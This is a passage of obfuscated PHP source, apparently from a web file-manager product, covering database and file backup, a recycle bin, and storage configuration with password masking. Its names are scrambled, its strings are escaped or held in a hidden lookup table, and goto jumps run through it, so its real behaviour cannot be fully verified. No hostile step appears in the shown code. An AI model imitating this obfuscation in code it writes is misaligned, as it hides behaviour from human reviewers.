(!$Ô¦æ†Î->index()) { return !1; } self::set(array($÷ô±ÏÀÊ[885] => 1)); return !0; } public function dbFile() { $üÍíß‰° =& $_SERVER[”øäÃÍª]; $É™ıÛÖ = self::get(); if (_get($É™ıÛÖ, $üÍíß‰°[886], 0) == $üÍíß‰°[91]) { return !0; } $İâØç®… = new BackupDbFile(); if (!$İâØç®…->index()) { return !1; } self::set(array($üÍíß‰°[886] => 1)); return !0; } public function file() { $º¯âà¨• =& $_SERVER[”øäÃÍª]; $òŒ§ÍÍ‡ = self::get(); if (_get($òŒ§ÍÍ‡, $º¯âà¨•[887], 0) == $º¯âà¨•[91]) { return !0; } if ($òŒ§ÍÍ‡[$º¯âà¨•[168]] == $º¯âà¨•[888]) { $ÕÇë½ò¾ = new BackupFile(); if (!$ÕÇë½ò¾->index()) { return !1; } } self::set(array($º¯âà¨•[887] => 1, $º¯âà¨•[859] => 1)); return !0; } public static function log($ñîøÜ“°) { write_log($ñîøÜ“°, $_SERVER[”øäÃÍª][889]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ñøÖ´éá =& $_SERVER[”øäÃÍª]; $ûúå¡Ç… = Backup::get(); self::$io = $ûúå¡Ç…[$ñøÖ´éá[861]]; self::$name = $ûúå¡Ç…[$ñøÖ´éá[32]]; $ºÒÕ£à­ = new DbManage(); $İ”¤öüè = $ºÒÕ£à­->dbType(); $”“ØËÀÆ = array($ñøÖ´éá[890] => $İ”¤öüè, $ñøÖ´éá[891] => time()); Backup::set($”“ØËÀÆ); $öÎÖÑ·À = $this->tmpFilesPath() . $ñøÖ´éá[892] . self::$name . $ñøÖ´éá[8]; del_dir($öÎÖÑ·À); mk_dir($öÎÖÑ·À); $´ØáË±” = $ï€İ™ë™ = 0; try { $ç¬µÌğ = $ºÒÕ£à­->db()->getTables(); } catch (Exception $ÂèÍ¾¼–) { Backup::log($ñøÖ´éá[893] . $ÂèÍ¾¼–->getMessage()); return !1; } $ç¬µÌğ = array_diff($ç¬µÌğ, array($ñøÖ´éá[894], $ñøÖ´éá[895])); foreach ($ç¬µÌğ as $ÒÕÏºİ¤) { if ($ÒÕÏºİ¤ == $ñøÖ´éá[472]) { continue; } $´ØáË±” += $ºÒÕ£à­->model($ÒÕÏºİ¤)->count(); } $Œ’Ï£­ƒ = new Task($ñøÖ´éá[896], $ñøÖ´éá[889], $´ØáË±”, LNG($ñøÖ´éá[897]) . $ñøÖ´éá[898] . LNG($ñøÖ´éá[899])); $GLOBALS[$ñøÖ´éá[900]] = self::$name; foreach ($ç¬µÌğ as $ÒÕÏºİ¤) { $ÀËä€É = $öÎÖÑ·À . $ÒÕÏºİ¤ . $ñøÖ´éá[901]; if ($ÒÕÏºİ¤ == $ñøÖ´éá[472]) { @touch($ÀËä€É); continue; } $›¸“¸ıÉ = null; if ($ÒÕÏºİ¤ == $ñøÖ´éá[902] && $ûúå¡Ç…[$ñøÖ´éá[168]] == $ñøÖ´éá[888]) { $›¸“¸ıÉ = self::$io; } $ï€İ™ë™ += $ºÒÕ£à­->sqlFromDb($ÒÕÏºİ¤, $ÀËä€É, $Œ’Ï£­ƒ, $›¸“¸ıÉ); } unset($GLOBALS[$ñøÖ´éá[900]]); $Œ’Ï£­ƒ->end(); if ($ï€İ™ë™ > $´ØáË±”) { $´ØáË±” = $ï€İ™ë™; } $”“ØËÀÆ = array($ñøÖ´éá[890] => $İ”¤öüè, $ñøÖ´éá[885] => 1, $ñøÖ´éá[903] => $´ØáË±”, $ñøÖ´éá[904] => $ï€İ™ë™, $ñøÖ´éá[905] => time()); Backup::set($”“ØËÀÆ); if ($´ØáË±” - $ï€İ™ë™ > 0) { $€¸ÌÓò = $ñøÖ´éá[906]; if (!stristr(I18n::getType(), $ñøÖ´éá[907])) { $€¸ÌÓò = $ñøÖ´éá[908]; } Backup::log(array($€¸ÌÓò, $”“ØËÀÆ)); return !1; } return !0; } private function tmpFilesPath() { $‰“‹ÑÃ¹ =& $_SERVER[”øäÃÍª]; $›¾ÁöÕ = TEMP_FILES; if ($GLOBALS[$‰“‹ÑÃ¹[6]][$‰“‹ÑÃ¹[92]][$‰“‹ÑÃ¹[909]]) { $›¾ÁöÕ = $GLOBALS[$‰“‹ÑÃ¹[6]][$‰“‹ÑÃ¹[92]][$‰“‹ÑÃ¹[909]]; if (!mk_dir($›¾ÁöÕ) || !is_writable($›¾ÁöÕ) || !IO::mkfile($›¾ÁöÕ . $‰“‹ÑÃ¹[910])) { $›¾ÁöÕ = TEMP_FILES; } } return $›¾ÁöÕ; } } class BackupDbFile { public function __construct() { } public function index() { $¤©ŠË¹ª =& $_SERVER[”øäÃÍª]; $ÍŠ¼•À— = Backup::get(); $ÅŒê¿¯Ä = $ÍŠ¼•À—[$¤©ŠË¹ª[32]]; $‰Ÿ¬æ÷ó = $this->tmpFilesPath() . "\142\141\x63\153\165\160\137{$ÅŒê¿¯Ä}\x2f"; $™¨•öÚ = $this->backupPath($ÍŠ¼•À—); if (!($™¨•öÚ = IO::mkdir($™¨•öÚ))) { Backup::log($¤©ŠË¹ª[911] . $™¨•öÚ); return !1; } $´ª¦ØŒ = new DbManage(); $­º„©‡ø = $´ª¦ØŒ->getSqlFile(); if (!$­º„©‡ø || !$­º„©‡ø[$¤©ŠË¹ª[912]] || !$­º„©‡ø[$¤©ŠË¹ª[13]]) { Backup::log($¤©ŠË¹ª[913]); return !1; } IO::move($­º„©‡ø[$¤©ŠË¹ª[912]], $‰Ÿ¬æ÷ó); IO::move($­º„©‡ø[$¤©ŠË¹ª[13]], $‰Ÿ¬æ÷ó); $´ª¦ØŒ->mixBakList($‰Ÿ¬æ÷ó); $øÚÅÆåæ = IO::listPath($‰Ÿ¬æ÷ó); $¿©´‚ŒÎ = isset($øÚÅÆåæ[$¤©ŠË¹ª[86]]) ? $øÚÅÆåæ[$¤©ŠË¹ª[86]] : array(); $ó½¼°¥ = array_sum(array_column($¿©´‚ŒÎ, $¤©ŠË¹ª[79])); if (!$ó½¼°¥) { Backup::log($¤©ŠË¹ª[914] . $‰Ÿ¬æ÷ó); return !1; } $Éê§¨ = array($¤©ŠË¹ª[915] => $ó½¼°¥, $¤©ŠË¹ª[916] => time()); Backup::set($Éê§¨); Hook::trigger($¤©ŠË¹ª[917], $‰Ÿ¬æ÷ó, $™¨•öÚ); $¶Íğ¥‰ = new TaskFileTransfer($¤©ŠË¹ª[917], $¤©ŠË¹ª[889], count($¿©´‚ŒÎ), LNG($¤©ŠË¹ª[897]) . $¤©ŠË¹ª[476] . LNG($¤©ŠË¹ª[899]) . $¤©ŠË¹ª[918]); $¶Íğ¥‰->task[$¤©ŠË¹ª[873]] = $ó½¼°¥; foreach ($øÚÅÆåæ[$¤©ŠË¹ª[86]] as $è¼ôù‘–) { $èÆïëï = IO::move($è¼ôù‘–[$¤©ŠË¹ª[87]], $™¨•öÚ); if (!$èÆïëï) { $¶Íğ¥‰->end(); $ç«©Ú‚Î = IO::getLastError($¤©ŠË¹ª[919] . $è¼ôù‘–[$¤©ŠË¹ª[87]] . $¤©ŠË¹ª[920] . $™¨•öÚ . $¤©ŠË¹ª[175]); Backup::log($ç«©Ú‚Î); return !1; } } $¶Íğ¥‰->end(); $Éê§¨ = array($¤©ŠË¹ª[921] => $ó½¼°¥, $¤©ŠË¹ª[922] => time()); Backup::set($Éê§¨); return !0; } private function backupPath($ï›âÊ) { $Ìø®Çìš =& $_SERVER[”øäÃÍª]; $¦¥¨®˜… = $ï›âÊ[$Ìø®Çìš[32]]; $³ò‚ü¯ = Model($Ìø®Çìš[882])->get($Ìø®Çìš[883]); $³ïÅ’¢İ = substr(md5($Ìø®Çìš[884] . $³ò‚ü¯ . $¦¥¨®˜…), 0, 8); return "\x7b\x69\x6f\72{$ï›âÊ[$Ìø®Çìš[861]]}\175\57\144\141\x74\x61\x62\x61\x73\145\57\x62\141\x63\153\x75\x70\57" . $¦¥¨®˜… . $Ìø®Çìš[11] . $³ïÅ’¢İ; } private function tmpFilesPath() { $°‘£§ÒÕ =& $_SERVER[”øäÃÍª]; $‚ã†Ì†ğ = TEMP_FILES; if ($GLOBALS[$°‘£§ÒÕ[6]][$°‘£§ÒÕ[92]][$°‘£§ÒÕ[909]]) { $‚ã†Ì†ğ = $GLOBALS[$°‘£§ÒÕ[6]][$°‘£§ÒÕ[92]][$°‘£§ÒÕ[909]]; if (!mk_dir($‚ã†Ì†ğ) || !is_writable($‚ã†Ì†ğ) || !IO::mkfile($‚ã†Ì†ğ . $°‘£§ÒÕ[910])) { $‚ã†Ì†ğ = TEMP_FILES; } } return $‚ã†Ì†ğ; } } goto C­ëâŸ®Ó; D•ÄÓ ¹­: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\143\x65\137\x72\145\143\x79\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\155\145", "\164\x69\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\x75\x6e\143\x74\151\x6f\156")); public function listData($şØõ…ğ = false) { $á¹“‘¯ =& $_SERVER[”øäÃÍª]; $şØõ…ğ = $şØõ…ğ ? $şØõ…ğ : USER_ID; $Ìà‘¼ğ = $this->where(array($á¹“‘¯[1925] => $şØõ…ğ))->select(); return array_to_keyvalue($Ìà‘¼ğ, $á¹“‘¯[12], $á¹“‘¯[191]); } public function moveToRecycle($Œ¥ú¢©) { $ì××¦°é =& $_SERVER[”øäÃÍª]; $ËıöÅ¾‘ = Model($ì××¦°é[1488]); $ñì‹¼ø = $ËıöÅ¾‘->sourceInfo($Œ¥ú¢©); if (!$ñì‹¼ø || $ñì‹¼ø[$ì××¦°é[528]] == $ì××¦°é[91]) { return; } $‘à™¬Ò€ = array($ì××¦°é[514] => $Œ¥ú¢©, $ì××¦°é[1925] => USER_ID, $ì××¦°é[678] => $ñì‹¼ø[$ì××¦°é[188]], $ì××¦°é[679] => $ñì‹¼ø[$ì××¦°é[597]], $ì××¦°é[682] => $ñì‹¼ø[$ì××¦°é[612]]); $this->add($‘à™¬Ò€); $this->recycleMove($Œ¥ú¢©, 1); if ($ñì‹¼ø[$ì××¦°é[508]] == $ì××¦°é[91]) { $«ÈëÇ¨· = array($ì××¦°é[682] => array($ì××¦°é[643], $ñì‹¼ø[$ì××¦°é[612]] . $Œ¥ú¢© . $ì××¦°é[644])); $ËıöÅ¾‘->where($«ÈëÇ¨·)->setField($ì××¦°é[528], 1); } } public function clear() { $this->remove(!1); } public function remove($ñÌÎ±…ù = false, $œàº¯´€ = false) { $¤Üíü¼ =& $_SERVER[”øäÃÍª]; $œàº¯´€ = $œàº¯´€ ? $œàº¯´€ : USER_ID; $¿ĞÄ¸¼÷ = Model($¤Üíü¼[1488]); $ÜêÀœ»ú = $this->listData($œàº¯´€); $ñÌÎ±…ù = $ñÌÎ±…ù === !1 ? !1 : $ñÌÎ±…ù; $ã¸®êòí = array(); foreach ($ÜêÀœ»ú as $¿ÇÚµ×) { if ($ñÌÎ±…ù != !1 && !in_array($¿ÇÚµ×, $ñÌÎ±…ù)) { continue; } $ÍÛ½Û¾é = $¿ĞÄ¸¼÷->sourceInfo($¿ÇÚµ×); $¿ĞÄ¸¼÷->remove($¿ÇÚµ×, !1); $ÛÃ÷¼«Ÿ = $ÍÛ½Û¾é[$¤Üíü¼[188]] . $¤Üíü¼[11] . $ÍÛ½Û¾é[$¤Üíü¼[597]]; $ã¸®êòí[$ÛÃ÷¼«Ÿ] = array($¤Üíü¼[678] => $ÍÛ½Û¾é[$¤Üíü¼[188]], $¤Üíü¼[597] => $ÍÛ½Û¾é[$¤Üíü¼[597]]); $this->where(array($¤Üíü¼[191] => $¿ÇÚµ×))->delete(); } foreach ($ã¸®êòí as $œÈ“›ßÁ) { $¿ĞÄ¸¼÷->targetSpaceUpdate($œÈ“›ßÁ[$¤Üíü¼[188]], $œÈ“›ßÁ[$¤Üíü¼[597]]); } } public function restore($¼À’ä÷« = false) { $Çä¸Û¬ = $this->listData(); $this->_restoreSource($Çä¸Û¬, $¼À’ä÷«); } public function removeUserAll($É¶øŞêà) { $this->remove(!1, $É¶øŞêà); } public function restoreItem($ÓúîÙé) { $this->_restoreSource(array($ÓúîÙé), array($ÓúîÙé)); } private function _restoreSource($ØÛäšÓ¹, $çèıŒ½) { $†Ğàº›í =& $_SERVER[”øäÃÍª]; $‘ş†Õ²Ê = Model($†Ğàº›í[1488]); $çèıŒ½ = $çèıŒ½ == !1 ? !1 : $çèıŒ½; if (!$ØÛäšÓ¹) { return !0; } $ÒÀ±ï÷¸ = array(); foreach ($ØÛäšÓ¹ as $©°îª²ñ) { if ($çèıŒ½ != !1 && !in_array($©°îª²ñ, $çèıŒ½)) { continue; } $ì…êòû† = $‘ş†Õ²Ê->sourceInfo($©°îª²ñ); $€ãÙ…ã = $‘ş†Õ²Ê->sourceInfo($ì…êòû†[$†Ğàº›í[190]]); if ($€ãÙ…ã[$†Ğàº›í[528]] == $†Ğàº›í[91]) { continue; } $‘ş†Õ²Ê->lockMoveStart($©°îª²ñ); $this->recycleMove($©°îª²ñ, 0); if ($ì…êòû†[$†Ğàº›í[508]] == $†Ğàº›í[91]) { $õ±Œí»í = array($†Ğàº›í[682] => array($†Ğàº›í[643], $ì…êòû†[$†Ğàº›í[612]] . $©°îª²ñ . $†Ğàº›í[644])); $‘ş†Õ²Ê->where($õ±Œí»í)->setField($†Ğàº›í[528], 0); $this->restoreFolderChildren($©°îª²ñ, $ØÛäšÓ¹); } $this->where(array($†Ğàº›í[191] => $©°îª²ñ))->delete(); $‘ş†Õ²Ê->folderSizeReset($ì…êòû†[$†Ğàº›í[190]]); $ÒÀ±ï÷¸[] = $ì…êòû†[$†Ğàº›í[190]]; if ($ì…êòû†[$†Ğàº›í[508]] == $†Ğàº›í[91]) { $ÒÀ±ï÷¸[] = $©°îª²ñ; } $‘ş†Õ²Ê->lockMoveEnd($©°îª²ñ); } $‘ş†Õ²Ê->updateModifyTime($ÒÀ±ï÷¸); } private function restoreFolderChildren($ßÙŸˆìš, $ö ïçğ) { $ÌŞ˜‹ë =& $_SERVER[”øäÃÍª]; $ïàÔÜåË = Model($ÌŞ˜‹ë[1488]); $åÏÑá§ì = array($ÌŞ˜‹ë[191] => array($ÌŞ˜‹ë[7], array())); foreach ($ö ïçğ as $°ÙØû¬…) { if ($°ÙØû¬… == $ßÙŸˆìš) { continue; } if (!$ïàÔÜåË->isParentOf($ßÙŸˆìš, $°ÙØû¬…)) { continue; } $ÃöåÉ’ = $ïàÔÜåË->sourceInfo($°ÙØû¬…); if ($ÃöåÉ’[$ÌŞ˜‹ë[508]] == $ÌŞ˜‹ë[91]) { $åÏÑá§ì[] = array($ÌŞ˜‹ë[682] => array($ÌŞ˜‹ë[643], $ÃöåÉ’[$ÌŞ˜‹ë[612]] . $°ÙØû¬… . $ÌŞ˜‹ë[644])); } else { $åÏÑá§ì[$ÌŞ˜‹ë[191]][1][] = $°ÙØû¬…; } } if (!$åÏÑá§ì[$ÌŞ˜‹ë[191]][1]) { unset($åÏÑá§ì[$ÌŞ˜‹ë[191]]); } if (!$åÏÑá§ì) { return; } if (is_array($åÏÑá§ì[$ÌŞ˜‹ë[191]]) && is_array($åÏÑá§ì[$ÌŞ˜‹ë[191]][1])) { $åÏÑá§ì[$ÌŞ˜‹ë[191]][1] = array_unique($åÏÑá§ì[$ÌŞ˜‹ë[191]][1]); } $åÏÑá§ì[$ÌŞ˜‹ë[1122]] = $ÌŞ˜‹ë[2240]; $ïàÔÜåË->where($åÏÑá§ì)->setField($ÌŞ˜‹ë[528], 1); } private function recycleMove($—ª‡æ…, $É’«ÛÀ­ = 1) { $¹Ü™¢¹§ =& $_SERVER[”øäÃÍª]; $‚Ş´àÕ… = Model($¹Ü™¢¹§[1488]); $°½ÍîÄ¥ = Model($¹Ü™¢¹§[2469]); $Êğ°ª = array($¹Ü™¢¹§[191] => $—ª‡æ…); if ($É’«ÛÀ­) { $‚Ş´àÕ…->where($Êğ°ª)->setField($¹Ü™¢¹§[528], 1); $°½ÍîÄ¥->eventRecycle($—ª‡æ…, $¹Ü™¢¹§[2470]); } else { $øë•§»© = $‚Ş´àÕ…->where($Êğ°ª)->find(); $¿È»ÎÄ = $øë•§»©[$¹Ü™¢¹§[508]] == $¹Ü™¢¹§[91]; $à¸ıæ± = $‚Ş´àÕ…->fileNameAuto($øë•§»©[$¹Ü™¢¹§[190]], $øë•§»©[$¹Ü™¢¹§[32]], REPEAT_RENAME_FOLDER, $¿È»ÎÄ); if ($à¸ıæ± != $øë•§»©[$¹Ü™¢¹§[32]]) { $‚Ş´àÕ…->rename($—ª‡æ…, $à¸ıæ±); } $‚Ş´àÕ…->where($Êğ°ª)->setField($¹Ü™¢¹§[528], 0); $°½ÍîÄ¥->eventRecycle($—ª‡æ…, $¹Ü™¢¹§[2471]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x73\157\165\162\x63\x65\x53\145\143\x72\145\x74\x4c\x69\163\x74"; public $field = array("\163\x6f\x75\162\x63\x65\x49\x44", "\x74\171\x70\145\x49\x44", "\x63\x72\145\x61\x74\145\125\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\x73\x74\157\162\141\x67\145\x4c\151\x73\x74"; public $field = array("\156\141\155\145", "\163\151\172\145\x4d\141\x78", "\163\x79\163\x74\x65\x6d", "\x64\x65\x66\x61\165\154\164", "\x64\x72\x69\166\145\x72", "\x63\157\156\x66\151\147"); public function listData($ÆÍœ°Õ = false, $¢“é¬›Ì = "\155\157\x64\151\x66\171\124\151\155\145", $‘ƒèœÙ = false) { $ÇŸçÄªî =& $_SERVER[”øäÃÍª]; $†¤¬ŒÇ = parent::listData($ÆÍœ°Õ, $¢“é¬›Ì, $‘ƒèœÙ); if ($ÆÍœ°Õ) { return $†¤¬ŒÇ; } $¡™–ÒÔš = array(); if ($GLOBALS[$ÇŸçÄªî[2472]]) { $¡™–ÒÔš = $this->ioSizeUseGet(array_to_keyvalue($†¤¬ŒÇ, $ÇŸçÄªî[12], $ÇŸçÄªî[487])); } foreach ($†¤¬ŒÇ as $òŒ¿¡İ€ => $¿ùÓë) { unset($†¤¬ŒÇ[$òŒ¿¡İ€][$ÇŸçÄªî[6]]); $†¤¬ŒÇ[$òŒ¿¡İ€][$ÇŸçÄªî[2129]] = isset($¡™–ÒÔš[$¿ùÓë[$ÇŸçÄªî[487]]]) ? $¡™–ÒÔš[$¿ùÓë[$ÇŸçÄªî[487]]] : 0; } return $†¤¬ŒÇ; } public function ioSizeUseGet($Ò¿µº–Ü) { $À‰ë¡³¾ =& $_SERVER[”øäÃÍª]; if (!$Ò¿µº–Ü) { return array(); } $î€«¨ÊÜ = $À‰ë¡³¾[2473] . implode($À‰ë¡³¾[50], $Ò¿µº–Ü); $ç«§Éçæ = Cache::get($î€«¨ÊÜ); if ($ç«§Éçæ) { return $ç«§Éçæ; } $§İÍç­ = array($À‰ë¡³¾[934] => $À‰ë¡³¾[487], $À‰ë¡³¾[2474] => $À‰ë¡³¾[79]); $¢˜‹ûš = array($À‰ë¡³¾[934] => array($À‰ë¡³¾[7], $Ò¿µº–Ü)); $ç«§Éçæ = Model($À‰ë¡³¾[902])->field($§İÍç­)->where($¢˜‹ûš)->group($À‰ë¡³¾[934])->select(); $ç«§Éçæ = array_to_keyvalue($ç«§Éçæ, $À‰ë¡³¾[487], $À‰ë¡³¾[79]); Cache::set($î€«¨ÊÜ, $ç«§Éçæ, 600); return $ç«§Éçæ; } public function getConfig($…ÓÖ­È) { $îÃÓ©àõ = parent::listData($…ÓÖ­È); $Şş’±İ· = _get($îÃÓ©àõ, $_SERVER[”øäÃÍª][6], array()); if ($Şş’±İ· && !is_array($Şş’±İ·)) { $Şş’±İ· = json_decode($Şş’±İ·, !0); } return $Şş’±İ·; } public function update($ƒÓ°äéº, $äïöô) { $×¶û»ğİ =& $_SERVER[”øäÃÍª]; $éÈÅ¹šª = $äïöô[$×¶û»ğİ[32]]; $š½€æŸ’ = array_to_keyvalue(parent::listData(), $×¶û»ğİ[32]); if (isset($š½€æŸ’[$éÈÅ¹šª]) && $š½€æŸ’[$éÈÅ¹šª][$×¶û»ğİ[487]] != $ƒÓ°äéº) { return !1; } $this->checkPwd($ƒÓ°äéº, $äïöô); if (isset($äïöô[$×¶û»ğİ[2475]]) && $äïöô[$×¶û»ğİ[2475]] == $×¶û»ğİ[91]) { $this->checkConfig($äïöô); } unset($äïöô[$×¶û»ğİ[2475]]); $çÂÊıÃÄ = parent::update($ƒÓ°äéº, $äïöô); if ($çÂÊıÃÄ && $äïöô[$×¶û»ğİ[37]]) { foreach ($š½€æŸ’ as $…Ãª·†) { if ($…Ãª·†[$×¶û»ğİ[37]] && $…Ãª·†[$×¶û»ğİ[487]] != $ƒÓ°äéº) { parent::update($…Ãª·†[$×¶û»ğİ[487]], array($×¶û»ğİ[37] => 0)); } } $this->updateBackup($ƒÓ°äéº, $š½€æŸ’); } return $çÂÊıÃÄ; } public function add($ÅÄÔ¹ÈÈ) { $°îğà»ò =& $_SERVER[”øäÃÍª]; $‹ÕïÆô‡ = array_to_keyvalue(parent::listData(), $°îğà»ò[32]); if (isset($‹ÕïÆô‡[$ÅÄÔ¹ÈÈ[$°îğà»ò[32]]])) { return !1; } $this->checkConfig($ÅÄÔ¹ÈÈ); $‡éèô·’ = parent::insert($ÅÄÔ¹ÈÈ); if ($‡éèô·’ && $ÅÄÔ¹ÈÈ[$°îğà»ò[37]]) { foreach ($‹ÕïÆô‡ as $ÑÀ„°¢) { if ($ÑÀ„°¢[$°îğà»ò[37]]) { parent::update($ÑÀ„°¢[$°îğà»ò[487]], array($°îğà»ò[37] => 0)); } } $this->updateBackup($‡éèô·’, $‹ÕïÆô‡); } return $‡éèô·’; } public function updateBackup($®µíùû, $ ÛÕœªù) { $º‚Ù½ùÑ =& $_SERVER[”øäÃÍª]; if ($®µíùû == $º‚Ù½ùÑ[91]) { return; } $Ÿ÷İÄÇ£ = Model($º‚Ù½ùÑ[857])->config(); $Š»ŠğÏ£ = $Ÿ÷İÄÇ£[$º‚Ù½ùÑ[861]]; if ($Ÿ÷İÄÇ£[$º‚Ù½ùÑ[1904]] != $º‚Ù½ùÑ[91] || $Š»ŠğÏ£ == $®µíùû) { return; } if ($Š»ŠğÏ£ != $º‚Ù½ùÑ[91]) { $•Õæ²²ê = array(); foreach ($ ÛÕœªù as $ÅÍÍ½Ø ) { if ($®µíùû == $ÅÍÍ½Ø [$º‚Ù½ùÑ[487]]) { continue; } $•Õæ²²ê[] = $ÅÍÍ½Ø [$º‚Ù½ùÑ[487]]; } if ($•Õæ²²ê && in_array($Š»ŠğÏ£, $•Õæ²²ê)) { return; } } $ª¹œ†Å½ = Model($º‚Ù½ùÑ[882])->get($º‚Ù½ùÑ[889]); $ª¹œ†Å½ = json_decode($ª¹œ†Å½, !0); if (!$ª¹œ†Å½) { return; } $ª¹œ†Å½[$º‚Ù½ùÑ[861]] = $®µíùû; Model($º‚Ù½ùÑ[882])->set(array($º‚Ù½ùÑ[889] => $ª¹œ†Å½)); } public function checkPwd($ëßêóÜ, &$ëËÓ„®€) { $Ëä¦šêó =& $_SERVER[”øäÃÍª]; if (empty($ëËÓ„®€[$Ëä¦šêó[6]])) { return; } $ÑêÚ§·— = $ëËÓ„®€[$Ëä¦šêó[6]]; if (!is_array($ÑêÚ§·—)) { $ÑêÚ§·— = json_decode($ÑêÚ§·—, !0); } $ƒşÅ÷ó = $Ëä¦šêó[12]; $á¯ìÀÖ = array($Ëä¦šêó[1596], $Ëä¦šêó[2476], $Ëä¦šêó[1008]); foreach ($á¯ìÀÖ as $ùå¾ÈĞë) { if (isset($ÑêÚ§·—[$ùå¾ÈĞë])) { $ƒşÅ÷ó = $ùå¾ÈĞë; break; } } if (!$ƒşÅ÷ó) { return; } $Ø‡Í—Õ¤ = $this->getConfig($ëßêóÜ); $µè«ŞµÎ = $Ø‡Í—Õ¤[$ƒşÅ÷ó]; $ãßˆİ÷… = $ÑêÚ§·—[$ƒşÅ÷ó]; if ($ãßˆİ÷… == str_repeat($Ëä¦šêó[220], strlen($µè«ŞµÎ))) { $ÑêÚ§·—[$ƒşÅ÷ó] = $µè«ŞµÎ; $ëËÓ„®€[$Ëä¦šêó[6]] = json_encode($ÑêÚ§·—); } else { if ($ãßˆİ÷… != $µè«ŞµÎ) { $ëËÓ„®€[$Ëä¦šêó[2475]] = $Ëä¦šêó[91]; } } } public function checkConfig(&$±•Úì±, $úâ§¸Øî = false) { $Ï³¢‡İÎ =& $_SERVER[”øäÃÍª]; $ÍÌ‰º‹ø = strtolower($±•Úì±[$Ï³¢‡İÎ[96]]); $ì¬¢”ıÁ = $±•Úì±[$Ï³¢‡İÎ[6]]; if (!is_array($ì¬¢”ıÁ)) { $ì¬¢”ıÁ = json_decode($ì¬¢”ıÁ, !0); } foreach ($ì¬¢”ıÁ as $Æã ü—­ => $ãûî÷á§) { if (is_string($ãûî÷á§)) { $ì¬¢”ıÁ[$Æã ü—­] = trim($ãûî÷á§); } } $ì¬¢”ıÁ[$Ï³¢‡İÎ[2477]] = rand_string(6); $óƒ¼øÕó = $GLOBALS[$Ï³¢‡İÎ[6]][$Ï³¢‡İÎ[92]][$Ï³¢‡İÎ[942]]; $ÆÂæèÀ‹ = isset($óƒ¼øÕó[$ÍÌ‰º‹ø]) ? $óƒ¼øÕó[$ÍÌ‰º‹ø] : ucfirst($ÍÌ‰º‹ø); $¥Í£êï = $Ï³¢‡İÎ[77] . $ÆÂæèÀ‹; if (!$ÆÂæèÀ‹ || !class_exists($¥Í£êï)) { if ($úâ§¸Øî) { return LNG($Ï³¢‡İÎ[2478]); } write_log(array($Ï³¢‡İÎ[2479], $±•Úì±, get_caller_info()), $Ï³¢‡İÎ[213]); show_json(LNG($Ï³¢‡İÎ[2478]), !1, $±•Úì±); } $Ûª‘ˆîŠ = new $¥Í£êï($ì¬¢”ıÁ); $°°ÃÈ¢± = rtrim($ì¬¢”ıÁ[$Ï³¢‡İÎ[1321]], $Ï³¢‡İÎ[8]) . $Ï³¢‡İÎ[8]; if (in_array($ÍÌ‰º‹ø, $Ûª‘ˆîŠ->objectDriver)) { try { if (!$Ûª‘ˆîŠ->isBucketCors() && !$Ûª‘ˆîŠ->setBucketCors()) { $ÁÌ±ôß = LNG($Ï³¢‡İÎ[2480]); $ÁÌ±ôß .= $Ï³¢‡İÎ[2481] . LNG($Ï³¢‡İÎ[2482]); } } catch (Exception $û±ÁÁ¯ì) { $ÁÌ±ôß = $û±ÁÁ¯ì->getMessage(); } if (isset($ÁÌ±ôß)) { return $this->_parseError($ÁÌ±ôß, $ÍÌ‰º‹ø, $úâ§¸Øî); } if ($ÍÌ‰º‹ø == $Ï³¢‡İÎ[68]) { $ØâóùÕ = $Ûª‘ˆîŠ->getBktRegion(); if ($ØâóùÕ != $ì¬¢”ıÁ[$Ï³¢‡İÎ[2483]]) { $ì¬¢”ıÁ[$Ï³¢‡İÎ[2483]] = $ØâóùÕ; $Ûª‘ˆîŠ->setRegion($ØâóùÕ); } } } else { if ($ÍÌ‰º‹ø == $Ï³¢‡İÎ[2484]) { if ($Ûª‘ˆîŠ->ftpPath) { $ÉìÃä¬ò = trim($°°ÃÈ¢±, $Ï³¢‡İÎ[8]); if (stripos($ÉìÃä¬ò, trim($Ûª‘ˆîŠ->ftpPath, $Ï³¢‡İÎ[8])) !== 0) { $°°ÃÈ¢± = $Ûª‘ˆîŠ->ftpPath . $Ï³¢‡İÎ[8] . ($ÉìÃä¬ò ? $ÉìÃä¬ò . $Ï³¢‡İÎ[8] : $Ï³¢‡İÎ[12]); } } } } $ÁÍê×æÙ = $Ûª‘ˆîŠ->getPath($°°ÃÈ¢± . $Ï³¢‡İÎ[1325]); try { if ($ÍÌ‰º‹ø == $Ï³¢‡İÎ[106]) { $Ûª‘ˆîŠ->mkdir($°°ÃÈ¢±); } $É»²Š = $Ûª‘ˆîŠ->mkfile($ÁÍê×æÙ); if (!$É»²Š) { $ÁÌ±ôß = LNG($Ï³¢‡İÎ[2480]); } } catch (Exception $û±ÁÁ¯ì) { $ÁÌ±ôß = $û±ÁÁ¯ì->getMessage(); } if (isset($ÁÌ±ôß)) { return $this->_parseError($ÁÌ±ôß, $ÍÌ‰º‹ø, $úâ§¸Øî); } $ì¬¢”ıÁ[$Ï³¢‡İÎ[1321]] = $°°ÃÈ¢±; $±•Úì±[$Ï³¢‡İÎ[6]] = json_encode($ì¬¢”ıÁ); $±•Úì±[$Ï³¢‡İÎ[96]] = $ÆÂæèÀ‹; return !0; } private function _parseError($Û ß´ Ü, $±ÂöĞµ, $íûì‹©Û = false) { $™‚•Æ–ñ =& $_SERVER[”øäÃÍª]; if ($±ÂöĞµ == $™‚•Æ–ñ[68] && stripos($Û ß´ Ü, $™‚•Æ–ñ[2485])) { $«ô³ú´ü = explode($™‚•Æ–ñ[10], $Û ß´ Ü); $ã†ã¦í§ = isset($«ô³ú´ü[1]) ? $«ô³ú´ü[1] : $™‚•Æ–ñ[12]; $ı…ÌŒí• = array($™‚•Æ–ñ[2486] => LNG($™‚•Æ–ñ[2487]), $™‚•Æ–ñ[2488] => LNG($™‚•Æ–ñ[2489])); if (isset($ı…ÌŒí•[$ã†ã¦í§])) { $Û ß´ Ü = $ı…ÌŒí•[$ã†ã¦í§]; } } if (stripos($Û ß´ Ü, $™‚•Æ–ñ[2490]) === 0) { $„·’–‘ = strpos($Û ß´ Ü, $™‚•Æ–ñ[175]); if ($„·’–‘ === !1) { $„·’–‘ = strpos($Û ß´ Ü, $™‚•Æ–ñ[4]); } if ($„·’–‘ !== 